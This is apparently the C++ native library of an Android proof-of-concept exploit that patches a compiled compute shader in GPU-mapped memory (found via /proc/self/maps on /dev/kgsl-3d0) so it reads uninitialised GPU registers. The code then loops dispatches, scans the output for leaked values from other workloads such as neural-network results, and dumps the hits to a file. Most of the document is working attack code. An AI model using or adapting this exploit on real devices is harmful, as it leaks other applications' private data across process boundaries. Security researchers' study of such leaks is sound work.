0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3d989899, 0x3f5dddde, 0x3f7efeff, 0x3f26a6a7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3c40c0c1, 0x3f4bcbcc, 0x3f7efeff, 0x3f5bdbdc, 0x3e0c8c8d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e189899, 0x3f7efeff, 0x3f7efeff, 0x3e9a9a9b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3df8f8f9, 0x3f60e0e1, 0x3f7efeff, 0x3ee6e6e7, 0x3b808081, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f058586, 0x3f7efeff, 0x3f7efeff, 0x3e50d0d1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0 };

// Also change in gComputeShader accordingly of you are changing these
#define NUM_GROUPS      8
#define LOCAL_SIZE      1024

static const char gComputeShader[] =
    "#version 320 es\n"
    "layout(local_size_x = 1024) in;\n" // <- CHANGE HERE
    "layout(binding = 0) readonly buffer Input0 {\n"
    "    uint data[];\n"
    "} input0;\n"
    "layout(binding = 1) readonly buffer Input1 {\n"
    "    uint data[];\n"
    "} input1;\n"
    "layout(binding = 2) writeonly buffer Output {\n"
    "    uint data[];\n"
    "} output0;\n"
    "void main()\n"
    "{\n"
    "    uint idx = gl_GlobalInvocationID.x;\n"
    "    output0.data[idx] = uint(0xffffffff) + input1.data[idx];\n"
    "}\n";
//uint(0x12ab34cd) -
#define CHECK() \
{\
    GLenum err = glGetError(); \
    if (err != GL_NO_ERROR) \
    {\
        __android_log_print(ANDROID_LOG_INFO,  __FUNCTION__, "glGetError returns %d\n", err); \
    }\
}

void hexDump(const void* data, size_t size, FILE* out_f) {
    int fd = memfd_create("log_tmp", 0);
    FILE *f = fdopen(fd, "r+");

    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    unsigned int addr = 0;
    for (i = 0; i < size; ++i) {
        if (i % 0x10 == 0) {
            fprintf(f, "%04X: ", addr);
            addr += 0x10;
        }

        fprintf(f, "%02X ", ((unsigned char*)data)[i]);

        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            fprintf(f, " ");
            if ((i+1) % 16 == 0) {
                fprintf(f, "|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    fprintf(f, " ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    fprintf(f, "   ");
                }
                fprintf(f, "|  %s \n", ascii);
            }
        }
    }

    fseek(f, 0, SEEK_SET);
    fseek(f, 0L, SEEK_END);
    size_t sz = ftell(f);
    fseek(f, 0, SEEK_SET);

    void* buf = malloc(sz + 1);

    fread(buf, sz, 1, f);
    ((char*)buf)[sz] = 0;

    __android_log_write(ANDROID_LOG_INFO,  __FUNCTION__, (char*)buf);

    if (out_f != NULL) {
        fwrite(data, size, 1, out_f);
    }

    free(buf);

    fclose(f);
}

void patch() {
    FILE *fp = fopen("/proc/self/maps", "r");
    if (!fp) {
        perror("Error opening file");
    }

    __android_log_print(ANDROID_LOG_INFO,  __FUNCTION__,"Patching shader binary code\n");

    char line[1024];
    while (fgets(line, sizeof(line), fp)) {
        unsigned long start, end, offset;
        char perms[5], dev[12], name[1024];
        int ret = sscanf(line, "%lx-%lx %4s %x %37s %*s %1023[^\n]",
                         &start, &end, perms, &offset, dev, name);
        if (ret == 5) {
            name[0] = '\0';
        }


        if (perms[0] == 'r'
            && strcmp(name, "/dev/binderfs/hwbinder") != 0
            && strcmp(name, "/dev/binderfs/binder") != 0
            && strcmp(name, "/dev/kgsl-3d0") == 0) {
            __android_log_print(ANDROID_LOG_INFO,  __FUNCTION__, "%lx-%lx | %s | %lx | %s\n", start, end, perms, offset, name);

            if (*(uint8_t*)start == 0xcf) {

                if (DEBUG) {
                    hexDump((void *)start, 0x90, NULL);
                }

                /*
                FILE* f2 = fopen("/data/data/com.example.testapp/cache/shader.bin", "w");
                fwrite((void*)start, 0x90, 1, f2);
                fclose(f2);
                 */

                //*(unsigned char*)(start + 0x4e) = 0x28;

                //*(unsigned char*)(start + 0x40) = 0x10 | 0x0;
                //*(unsigned char*)(start + 0x42) = 0x00;
                //*(unsigned char*)(start + 0x43) = 0x20;

                /*
                 * Report version: Leaking r44
                 */
                // 8: (sy)mov.u32u32 r0.y, r44.y
                //*(uint32_t*)(start + 0x40) = 0x000000b1;
                //*(uint32_t*)(start + 0x44) = 0x300cc001;


                /*
                 * Experiments go here
                 */
                // read r1.y
                //*(uint32_t*)(start + 0x40) = 0x00000015;
                //*(uint32_t*)(start + 0x44) = 0x300cc001;

                // read r4.y
                //*(uint32_t*)(start + 0x40) = 0x00000011;
                //*(uint32_t*)(start + 0x44) = 0x300cc001;

                // read r2.x
                *(uint32_t*)(start + 0x40) = 0x00000008;
                *(uint32_t*)(start + 0x44) = 0x300cc001;

                //if (DEBUG) {
                    /*hexDump((void*)start, 0x90, NULL);

                    FILE* f3 = fopen("/data/data/com.example.testapp/cache/shader_patched.bin", "w");
                    fwrite((void*)start, 0x90, 1, f3);
                    fclose(f3);*/
                //}
            }
        }
    }

    fclose(fp);

    __android_log_print(ANDROID_LOG_INFO,  __FUNCTION__,"Done.\n");
}

GLuint loadShader(GLenum shaderType, const char* pSource) {
    GLuint shader = glCreateShader(shaderType);
    if (shader) {
        glShaderSource(shader, 1, &pSource, NULL);
        glCompileShader(shader);
        GLint compiled = 0;
        glGetShaderiv(shader, GL_COMPILE_STATUS, &compiled);
        if (!compiled) {
            GLint infoLen = 0;
            glGetShaderiv(shader, GL_INFO_LOG_LENGTH, &infoLen);
            if (infoLen) {
                char* buf = (char*) malloc(infoLen);
                if (buf) {
                    glGetShaderInfoLog(shader, infoLen, NULL, buf);
                    __android_log_print(ANDROID_LOG_INFO,  __FUNCTION__, "Could not compile shader %d:\n%s\n", shaderType, buf);
                    free(buf);
                }
                glDeleteShader(shader);
                shader = 0;
            }
        }
    }
    return shader;
}

GLuint createComputeProgram(const char* pComputeSource) {
    GLuint computeShader = loadShader(GL_COMPUTE_SHADER, pComputeSource);
    if (!computeShader) {
        return 0;
    }

    GLuint program = glCreateProgram();
    if (program) {
        glAttachShader(program, computeShader);
        glLinkProgram(program);
        GLint linkStatus = GL_FALSE;
        glGetProgramiv(program, GL_LINK_STATUS, &linkStatus);
        if (linkStatus != GL_TRUE) {
            GLint bufLength = 0;
            glGetProgramiv(program, GL_INFO_LOG_LENGTH, &bufLength);
            if (bufLength) {
                char* buf = (char*) malloc(bufLength);
                if (buf) {
                    glGetProgramInfoLog(program, bufLength, NULL, buf);
                    __android_log_print(ANDROID_LOG_INFO,  __FUNCTION__, "Could not link program:\n%s\n", buf);
                    free(buf);
                }
            }
            glDeleteProgram(program);
            program = 0;
        }
    }
    return program;
}

void setupSSBufferObject(GLuint& ssbo, GLuint index, unsigned int* pIn, GLuint count)
{
    glGenBuffers(1, &ssbo);
    glBindBuffer(GL_SHADER_STORAGE_BUFFER, ssbo);

    glBufferData(GL_SHADER_STORAGE_BUFFER, count * sizeof(unsigned int), pIn, GL_STATIC_DRAW);
    glBindBufferBase(GL_SHADER_STORAGE_BUFFER, index, ssbo);
}

bool isMemoryAllValue(const void* ptr, size_t size, uint8_t value) {
    const unsigned char* bytes = (const unsigned char*)ptr;
    for (size_t i = 0; i < size; i++) {
        if (bytes[i] != value) {
            return false;
        }
    }
    return true;
}

void computeShader()
{
    GLuint computeProgram;
    GLuint input0SSbo;
    GLuint input1SSbo;
    GLuint outputSSbo;

    CHECK();
    computeProgram = createComputeProgram(gComputeShader);
    CHECK();

    const GLuint arraySize = NUM_GROUPS * LOCAL_SIZE;
    unsigned int f0[arraySize];
    unsigned int f1[arraySize];
    for (GLuint i = 0; i < arraySize; ++i)
    {
        f0[i] = 0;
        f1[i] = 0;
    }
    setupSSBufferObject(input0SSbo, 0, f0, arraySize);
    setupSSBufferObject(input1SSbo, 1, f1, arraySize);
    setupSSBufferObject(outputSSbo, 2, NULL, arraySize);
    CHECK();

    glUseProgram(computeProgram);

    patch();

    __android_log_print(ANDROID_LOG_INFO, __FUNCTION__, "Trying to leak..\n");
    for (unsigned int k = 0; k < 1000; k++) {
        __android_log_print(ANDROID_LOG_INFO, __FUNCTION__, "(1)\n");

        glDispatchCompute(NUM_GROUPS, 1, 1);   // arraySize/local_size_x
        glMemoryBarrier(GL_SHADER_STORAGE_BARRIER_BIT);
        CHECK();

        glBindBuffer(GL_SHADER_STORAGE_BUFFER, outputSSbo);
        unsigned int *pOut = (unsigned int *) glMapBufferRange(GL_SHADER_STORAGE_BUFFER, 0,
                                                               arraySize * sizeof(unsigned int),
                                                               GL_MAP_READ_BIT);

        // CNN

        /*bool plotted = false;
        for (GLuint i = 0; i < arraySize; i++) {
            for (unsigned int j = 0; j < 576; j++) {
                if (pOut[i] == cnn_r2x_output[j] && pOut[i] != 0x0 && pOut[i] != 0x3f800000) {
                    size_t offset = (unsigned long) &pOut[i] - (unsigned long) &pOut[0];
                    __android_log_print(ANDROID_LOG_INFO, __FUNCTION__,
                                        "(2) LEAK SUCCESS at array offset 0x%x | CNN idx: (%d) 0x%x | value: 0x%x\n", offset, j, j, cnn_r2x_output[j]);

                    if (!plotted && (offset & 0xF00) == 0xC00) {
                        hexDump((void *) pOut, arraySize * sizeof(unsigned int) - 1, NULL);
                        plotted = true;
                    }

                    glUnmapBuffer(GL_SHADER_STORAGE_BUFFER);
                    //exit(0);
                    goto cont;
                }
            }
        }
cont:
        */



        // 0x300 = 0xC00 / 4
        // 0x400 = 0x1000 / 4
        for (GLuint i = 0x300; i < arraySize - 0x400; i += 0x400) {
            for (unsigned int j = 0; j < 576; j++) {
                float f = *(float *) &pOut[i];

                bool firstBlockIsZero = true;
                uint8_t* tmp_ptr = (uint8_t*)&pOut[i] - 0x80;

                for (size_t j = 0; j < 0x80; j++) {
                    if (tmp_ptr[j] != 0) {
                        firstBlockIsZero = false;
                        break;
                    }
                }

                if (pOut[i] != 0x0 && pOut[i] != 0xFFFFFFFF && pOut[i] != 0x3f800000 &&
                    pOut[i] != pOut[i + 1] &&
                    f > 0.0f && f <= 2.0 &&
                    (pOut[i] & 0xFFFF0000) != 0 &&
                    firstBlockIsZero) {

                    size_t offset = (unsigned long) &pOut[i] - (unsigned long) &pOut[0];

                    __android_log_print(ANDROID_LOG_INFO, __FUNCTION__,
                                        "LEAK SUCCESS at array offset 0x%lx, actual: 0x%x\n", offset,
                                        pOut[i]);

                    FILE* f = fopen("/data/data/com.example.testapp/cache/leaked_out.bin", "w");
                    fwrite((void*)&pOut[i], 0x400, 1, f);
                    fclose(f);

                    hexDump((void *) pOut, arraySize * sizeof(unsigned int) - 1, NULL);
                }
            }
        }

        glUnmapBuffer(GL_SHADER_STORAGE_BUFFER);
    }

    __android_log_print(ANDROID_LOG_INFO,  __FUNCTION__, "verification PASSED\n");
    glDeleteProgram(computeProgram);
}

void setupComputeShader() {
    __android_log_print(ANDROID_LOG_INFO,  __FUNCTION__,"num_platforms: %d\n", 0);

    EGLDisplay dpy = eglGetDisplay(EGL_DEFAULT_DISPLAY);
    if (dpy == EGL_NO_DISPLAY) {
        __android_log_print(ANDROID_LOG_INFO,  __FUNCTION__, "eglGetDisplay returned EGL_NO_DISPLAY.\n");
        return;
    }

    EGLint majorVersion;
    EGLint minorVersion;
    EGLBoolean returnValue = eglInitialize(dpy, &majorVersion, &minorVersion);
    if (returnValue != EGL_TRUE) {
        __android_log_print(ANDROID_LOG_INFO,  __FUNCTION__, "eglInitialize failed\n");
        return;
    }

    EGLConfig cfg;
    EGLint count;
    EGLint s_configAttribs[] = {
            EGL_RENDERABLE_TYPE, EGL_OPENGL_ES3_BIT_KHR,
            EGL_NONE };
    if (eglChooseConfig(dpy, s_configAttribs, &cfg, 1, &count) == EGL_FALSE) {
        __android_log_print(ANDROID_LOG_INFO,  __FUNCTION__, "eglChooseConfig failed\n");
        return;
    }

    EGLint context_attribs[] = { EGL_CONTEXT_CLIENT_VERSION, 3, EGL_NONE };
    EGLContext context = eglCreateContext(dpy, cfg, EGL_NO_CONTEXT, context_attribs);

    returnValue = eglMakeCurrent(dpy, EGL_NO_SURFACE, EGL_NO_SURFACE, context);
    if (returnValue != EGL_TRUE) {
        __android_log_print(ANDROID_LOG_INFO,  __FUNCTION__, "eglMakeCurrent failed returned %d\n", returnValue);
        return;
    }

    computeShader();

    eglDestroyContext(dpy, context);
}

extern "C" JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) {
    __android_log_print(ANDROID_LOG_INFO,  __FUNCTION__,"Hello from shared library!\n");

    if (DEBUG) {
        setupComputeShader();
    }

    return JNI_VERSION_1_6;
}
extern "C"
JNIEXPORT void JNICALL
Java_com_example_testapp_MainActivity_runComputeShader(JNIEnv *env, jobject thiz) {
    if (!DEBUG) {
        setupComputeShader();
    }
}